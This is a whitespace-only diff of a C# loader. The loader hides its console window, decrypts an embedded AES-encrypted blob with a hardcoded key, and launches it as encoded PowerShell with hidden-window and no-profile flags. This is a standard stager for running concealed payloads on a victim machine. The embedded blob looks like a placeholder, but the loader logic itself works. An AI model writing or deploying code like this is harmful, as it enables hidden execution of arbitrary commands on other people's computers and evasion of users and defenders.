@@ -16,8 +16,8 @@ namespace Default {
 		private static String key = "73c5c318c201b8561160db079a864d9d";
 		private static String encryptedStringWithIV = "VGhpcyBpcyBhbiBJVjEyM6rf";
 		
-		// hide window
-		[DllImport("kernel32.dll")]
+        // hide window
+        [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -29,13 +29,13 @@ namespace Default {
             // hide window
             var windowHandle = GetConsoleWindow();
             ShowWindow(windowHandle, SW_HIDE);
-            
+
             // decode / decrypt payload
-			byte[] bytes = System.Convert.FromBase64String(encryptedStringWithIV);
-			bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());
-			
-			Process process = new Process();
-			process.StartInfo.UseShellExecute = false; 					
+            byte[] bytes = System.Convert.FromBase64String(encryptedStringWithIV);
+            bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());
+
+            Process process = new Process();
+            process.StartInfo.UseShellExecute = false; 					
             process.StartInfo.FileName = "powershell.exe";
             process.StartInfo.Arguments =  "-nop -w hidden -Enc " + System.Convert.ToBase64String(bytes);
             process.StartInfo.UseShellExecute = false;
